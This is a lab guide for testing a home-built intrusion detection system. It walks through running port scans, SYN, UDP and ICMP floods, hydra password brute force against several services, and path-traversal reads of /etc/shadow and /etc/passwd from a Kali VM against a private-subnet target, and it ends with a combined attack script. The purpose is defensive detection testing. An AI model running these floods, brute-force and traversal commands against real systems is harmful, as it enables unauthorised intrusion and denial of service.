# Kali Linux Attack Simulation Guide
## Step-by-Step Instructions to Test All 6 Attack Types

**Prerequisites:**
- Kali Linux VM running
- IDS system running on Ubuntu VM (IP: 192.168.100.4)
- Network connectivity between VMs

---

## 1. Port Scan Attack (Probe)

**What it does:** Scans multiple ports to discover open services

**Steps:**
```bash
# 1. Find the IDS server IP (usually 192.168.100.4)
ping -c 2 192.168.100.4

# 2. Scan common ports (will trigger port scan detection)
nmap -p 1-1000 192.168.100.4

# 3. For more aggressive scan (faster, more ports)
nmap -p 1-65535 -T4 192.168.100.4

# 4. Sequential port scan (very obvious pattern)
for port in {1..100}; do
  nc -zv 192.168.100.4 $port 2>&1 | grep -i open
done
```

**Expected Detection:** Attack type = "probe", is_malicious = true

---

## 2. DoS Attack (Denial of Service)

**What it does:** Floods the server with requests to overwhelm it

**Steps:**
```bash
# 1. SYN Flood Attack (TCP DoS)
hping3 -S -p 5001 --flood 192.168.100.4

# 2. HTTP Flood (if demo site is running on port 8080)
for i in {1..1000}; do
  curl -s http://192.168.100.4:8080 > /dev/null &
done
wait

# 3. UDP Flood
hping3 --udp -p 5001 --flood 192.168.100.4

# 4. ICMP Flood (Ping Flood)
ping -f 192.168.100.4

# Stop attacks: Press Ctrl+C
```

**Expected Detection:** Attack type = "dos", is_malicious = true

---

## 3. Brute Force Attack

**What it does:** Repeated login attempts to guess credentials

**Steps:**
```bash
# 1. SSH Brute Force (if SSH is enabled)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.4 ssh

# 2. HTTP Login Brute Force (for demo site on port 8080)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.4 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# 3. Manual brute force simulation (multiple failed logins)
for i in {1..20}; do
  curl -X POST http://192.168.100.4:8080/login \
    -d "username=admin&password=wrongpass$i" \
    -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null
  sleep 0.5
done

# 4. MySQL Brute Force (if MySQL is running)
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.100.4 mysql
```

**Expected Detection:** Attack type = "brute_force", is_malicious = true

---

## 4. R2L Attack (Remote to Local)

**What it does:** Attempts to gain unauthorized access from remote location

**Steps:**
```bash
# 1. Multiple failed SSH login attempts
for i in {1..10}; do
  ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
    fakeuser$i@192.168.100.4 "exit" 2>&1 | grep -i "permission denied\|connection refused"
  sleep 1
done

# 2. FTP Brute Force (if FTP is running)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.4 ftp

# 3. Telnet Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.4 telnet

# 4. SMB/CIFS Brute Force (Windows shares)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.100.4 smb
```

**Expected Detection:** Attack type = "r2l", is_malicious = true

---

## 5. U2R Attack (User to Root)

**What it does:** Attempts to escalate privileges from user to root

**Steps:**
```bash
# Note: U2R attacks are harder to simulate without actual access
# These simulate privilege escalation attempts

# 1. Attempt to access root directories
for path in /root /etc/shadow /etc/passwd; do
  curl -s http://192.168.100.4:8080/../../$path 2>&1 | head -1
done

# 2. Attempt sudo commands (if you have SSH access)
# ssh user@192.168.100.4 "sudo -l"  # List sudo permissions
# ssh user@192.168.100.4 "sudo -u root id"  # Try to run as root

# 3. Buffer overflow attempt (simulated)
python3 << 'EOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.100.4', 5001))
# Send oversized buffer
s.send(b'A' * 10000)
s.close()
EOF

# 4. Attempt to access sensitive files via HTTP
curl -s "http://192.168.100.4:8080/../../../etc/passwd" 2>&1
curl -s "http://192.168.100.4:8080/../../../etc/shadow" 2>&1
```

**Expected Detection:** Attack type = "u2r", is_malicious = true

---

## 6. Mixed/Unknown Attack

**What it does:** Combination of attacks that don't fit a single category

**Steps:**
```bash
# 1. Mixed attack: Port scan + DoS
nmap -p 1-100 192.168.100.4 &
hping3 -S -p 5001 --flood 192.168.100.4 &
sleep 10
pkill nmap
pkill hping3

# 2. Unusual traffic patterns
# Rapid connection attempts to random ports
for i in {1..50}; do
  port=$((RANDOM % 65535))
  timeout 0.1 nc -zv 192.168.100.4 $port 2>&1 &
done
wait

# 3. Slow port scan (stealthy)
nmap -sS -T2 -p 1-1000 192.168.100.4  # Slow scan

# 4. Fragmented packets (evasion technique)
nmap -f 192.168.100.4
```

**Expected Detection:** Attack type = "unknown_attack" or mixed types, is_malicious = true

---

## Quick Test Script (All Attacks)

Create a script to test all attacks at once:

```bash
# Save as: test_all_attacks.sh
#!/bin/bash

IDS_IP="192.168.100.4"

echo "=== Testing All 6 Attack Types ==="
echo "IDS Server: $IDS_IP"
echo ""

echo "1. Port Scan (Probe)..."
nmap -p 1-500 $IDS_IP > /dev/null 2>&1
sleep 2

echo "2. DoS Attack..."
hping3 -S -p 5001 --flood $IDS_IP > /dev/null 2>&1 &
HPING_PID=$!
sleep 5
kill $HPING_PID 2>/dev/null
sleep 2

echo "3. Brute Force..."
for i in {1..15}; do
  curl -s -X POST http://$IDS_IP:8080/login \
    -d "username=admin&password=wrong$i" \
    -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
  sleep 0.3
done
sleep 2

echo "4. R2L Attack..."
for i in {1..8}; do
  ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no \
    fakeuser$i@$IDS_IP "exit" > /dev/null 2>&1
done
sleep 2

echo "5. U2R Attack..."
for path in /root /etc/shadow; do
  curl -s "http://$IDS_IP:8080/../../$path" > /dev/null 2>&1
done
sleep 2

echo "6. Mixed Attack..."
nmap -p 1-200 $IDS_IP > /dev/null 2>&1 &
hping3 -S -p 5001 -c 100 $IDS_IP > /dev/null 2>&1 &
wait

echo ""
echo "=== All attacks completed! ==="
echo "Check your IDS Monitoring tab to see detections"
```

**Make it executable and run:**
```bash
chmod +x test_all_attacks.sh
./test_all_attacks.sh
```

---

## Monitoring Results

**On Ubuntu VM (IDS Server):**
1. Open browser: `http://192.168.100.4:5173`
2. Go to **Monitoring** tab
3. Look for alerts with:
   - 🚨 **ATTACK DETECTED** badge (red)
   - Attack types: probe, dos, brute_force, r2l, u2r, or unknown_attack
   - Confidence scores

**Check backend logs:**
```bash
# On Ubuntu VM
tail -f /tmp/ids-prediction.log | grep "ATTACK DETECTED"
```

---

## Tips

1. **Run attacks one at a time** to see clear detections
2. **Wait 10-30 seconds** between attacks for detection to process
3. **Check Monitoring tab** after each attack
4. **Use different source IPs** if testing from multiple machines
5. **Stop attacks** with `Ctrl+C` or `pkill` if they get too aggressive

---

## Troubleshooting

**No detections?**
- Check IDS is running: `ps aux | grep prediction_service`
- Check network connectivity: `ping 192.168.100.4`
- Check firewall isn't blocking: `sudo ufw status`

**Attacks too slow?**
- Use `-T4` or `-T5` flags with nmap for faster scans
- Reduce port ranges: `-p 1-100` instead of `-p 1-65535`

**Need to stop all attacks?**
```bash
pkill nmap
pkill hping3
pkill hydra
pkill curl
```

